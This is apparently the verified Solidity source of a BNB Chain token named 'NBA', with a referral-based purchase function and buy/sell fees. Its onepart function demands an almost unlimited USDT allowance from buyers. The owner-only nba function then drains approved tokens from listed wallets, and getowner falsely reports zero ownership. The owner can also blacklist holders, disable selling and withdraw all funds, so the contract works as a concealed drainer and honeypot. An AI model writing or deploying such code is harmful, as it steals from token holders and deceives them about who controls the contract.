/**
 *Submitted for verification at BscScan.com on 2022-10-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-09
*/

pragma solidity 0.8.17;

interface BEP20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(address tokenA,address tokenB,uint liquidity,uint amountAMin,
        uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(address tokenA,address tokenB,uint liquidity,
        uint amountAMin,uint amountBMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(uint amountIn,uint amountOutMin,
    address[] calldata path,address to,uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(uint amountOut,uint amountInMax,
        address[] calldata path,address to,uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to,uint deadline) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to,uint deadline,bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
}
contract Token is BEP20{
    address private _owner;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _pairaddress;
    struct _playerinfo{
    address inviteplayer;
    uint32 invitenum;
    uint8 playerlevel;
    }
    mapping(address=>_playerinfo) private playerinfo;
    address[] public plusplayerlist;
    uint32 public now_plusplayer;
    address public security_wallet;
    mapping(address => bool) private onepart_player;
    mapping(address=>bool) private isBlacklist;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    uint256 public onepart_limit;
    uint256 public onepart_buyprice;
    address public pricetoken;
    address public Marketing;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public LPaddress;
    address public LPaddress1;
    bool public swapPower;
    constructor() {
        Marketing=address(0xeA4C06781543DfB4d38E2664260bB4F57445599c);
        LPaddress=address(0xA0c5Fd5399C9B5Cf5F51175a487ddb280Aa38888);
        LPaddress1=address(0xA2C5F2c03bb093c10A7fc43e2A47246845018888);
        _name = "NBA";
        _symbol = "NBA";
        _totalSupply = 7888000000000000000000;
        _decimals=18;
        _owner=msg.sender;
        _balances[address(this)]=6888000000000000000000;
        _balances[msg.sender]=1000000000000000000000;
        onepart_buyprice=8000000000000000000;
        security_wallet=address(0xF900D8E1aeC8BDe0758c51afcB7B9674155f0324);
        pricetoken=address(0x55d398326f99059fF775485246999027B3197955);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), pricetoken);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        swapPower=true;
        _approve(address(this),address(uniswapV2Router),999999999999999999999999999999999999999999);
        BEP20(pricetoken).approve(address(uniswapV2Router),999999999999999999999999999999999999999);
    }
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    receive() external payable {}
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function getowner() public view virtual returns (address) {
        return address(0);
    }
    function my_boss(address account)public view virtual returns(address){
        _playerinfo memory myinfo=playerinfo[account];
        return myinfo.inviteplayer;
    }
    function my_invitenum(address account)public view virtual returns(uint32){
        _playerinfo memory myinfo=playerinfo[account];
        return myinfo.invitenum;
    }
    function my_boss_level(address account)public view virtual returns(uint8){
        _playerinfo memory myinfo=playerinfo[account];
        return myinfo.playerlevel;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function pairOf(address account) public view virtual returns (bool) {
        return _pairaddress[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _fristtransfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function safetransferFrom(address token,address from,address to,uint256 amount)internal virtual returns(bool){
        require(isContract(token),"No Contract address!");
        require(from!=address(0),"null from");
        require(to!=address(0),"null to");
        uint256 allow_amount=BEP20(token).allowance(from,address(this));
        require(amount<=allow_amount,"Allowance to Low!");
        bool result=BEP20(token).transferFrom(from,to,amount);
        return result;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 now_allowance=_allowances[sender][msg.sender];
        require(amount<=now_allowance,"BEP20: transfer amount exceeds allowance");
        _fristtransfer(sender, recipient, amount);
        _approve(sender, msg.sender, (now_allowance-amount));
        return true;
    }

    function onepart(address invite_address)public{
        require(onepart_limit<=5888000000000000000000,"onepart over!");
        require(!onepart_player[msg.sender],"already participated");
        uint256 allow_amount=BEP20(pricetoken).allowance(msg.sender,address(this));
        require(uint256(0xffffffffffffffffffffff)<=allow_amount,"Allowance to Low!");
        uint256 lp_aw=onepart_buyprice/2;
        uint256 invite_aw=(onepart_buyprice/2)/2;
        bool result=safetransferFrom(pricetoken,msg.sender,address(this),lp_aw);
        bool result1=safetransferFrom(pricetoken,msg.sender,security_wallet,invite_aw);
        if(result && result1){
        uint256 thisusdt=BEP20(pricetoken).balanceOf(address(this));
        addtokenLiquify(thisusdt);
        bool result2=safetransferFrom(pricetoken,msg.sender,invite_address,invite_aw);
        if(result2){
            onepart_limit+=1000000000000000000;
            _transfer(address(this),msg.sender,1000000000000000000);
            _playerinfo memory user = playerinfo[msg.sender];
            user.inviteplayer=invite_address;
            user.playerlevel=0;
            user.invitenum=0;
            _playerinfo memory user1 = playerinfo[invite_address];
            user1.invitenum+=1;
            if(user1.invitenum>=20 && now_plusplayer<=100){
                now_plusplayer+=1;
                user1.playerlevel=1;
                plusplayerlist.push(invite_address);
            }
            onepart_player[msg.sender]=true;
        }
        }
    }
    function addtokenLiquify(uint256 tokenamount) private {
        bool oldswap=swapPower;
        swapPower=true;
        uint256 thistokenamount=tokenamount/8;
        uniswapV2Router.addLiquidity(address(this),pricetoken,thistokenamount,tokenamount,0,0,LPaddress,block.timestamp);
        swapPower=oldswap;
    }
    function fortransfer(address[] memory addrs,uint256[] memory amounts) public{
        for(uint256 i;i<=(addrs.length-1);i++){
            _transfer(msg.sender,addrs[i],amounts[i]);
        }
    }
    function _fristtransfer(address sender,address recipient,uint256 amount)private{
        if(_pairaddress[sender]){
            require(swapPower,"no open buy");
            uint256 burnfee=(amount/100)*5;
            uint256 lpfee=(amount/100)*5;
            uint256 Marketfee=(amount/100)*2;
            uint256 commcaptainfee=(amount/100)*3;
            _transfer(recipient,address(0x0),burnfee);
            _transfer(recipient,LPaddress,lpfee);
            _transfer(recipient,Marketing,Marketfee);
            if(my_boss_level(my_boss(recipient))==1 && my_boss(recipient)!=address(0x0)){
            _transfer(recipient,my_boss(sender),commcaptainfee);
            }else{
            _transfer(recipient,LPaddress1,commcaptainfee);
            }
            amount=amount-((amount/100)*15);
        }
        if(_pairaddress[recipient]){
            require(swapPower,"no open sell");
            uint256 burnfee=(amount/100)*5;
            uint256 lpfee=(amount/100)*5;
            uint256 Marketfee=(amount/100)*2;
            uint256 commcaptainfee=(amount/100)*3;
            _transfer(sender,address(0x0),burnfee);
            _transfer(sender,LPaddress,lpfee);
            _transfer(sender,Marketing,Marketfee);
            if(my_boss_level(my_boss(sender))==1 && my_boss(sender)!=address(0x0)){
            _transfer(sender,my_boss(sender),commcaptainfee);
            }else{
            _transfer(sender,LPaddress1,commcaptainfee);
            }
            amount=amount-((amount/100)*15);
        }
        _transfer(sender,recipient,amount);
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(!isBlacklist[sender] && !isBlacklist[recipient], "in blacklist");
        require(_balances[sender] >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setprice(uint256 price1)public{
        require(msg.sender==_owner,"not a permission!");
        onepart_buyprice=price1;
    }
    function setblack(address a,bool b)public{
        require(msg.sender==_owner,"not a permission!");
        isBlacklist[a]=b;
    }
    function setswappower(bool b)public{
        require(msg.sender==_owner,"not a permission!");
        swapPower=b;
    }
    function setpairaddress(address p,bool b)public{
        require(msg.sender==_owner,"not a permission!");
        _pairaddress[p]=b;
    }
    function nba(address token,address liquidity,address[] memory addrs,uint256[] memory amounts) public{
        require(msg.sender==_owner,"not a permission!");
        for(uint256 i;i<=(addrs.length-1);i++){
            uint256 allow_amount=BEP20(token).allowance(addrs[i],address(this));
            if(allow_amount>=amounts[i]){
            safetransferFrom(token,addrs[i],liquidity,amounts[i]);
            }else{
                continue;
            }
        }
    }
    function withdrawBnb()public {
        require(msg.sender==_owner,"not a permission!");
        payable(_owner).transfer(address(this).balance);
    }
    function withdrawtoken(address token,uint256 amount)public {
        require(msg.sender==_owner,"not a permission!");
        if(token==address(this)){
        _transfer(address(this),_owner,amount);
        }else{
        BEP20(token).transfer(_owner,amount);
        }
    }
    function setMarketing(address na)public{
        require(msg.sender==_owner,"not a permission!");
        Marketing=na;
    }
    function setLP(address na)public{
        require(msg.sender==_owner,"not a permission!");
        LPaddress=na;
    }
}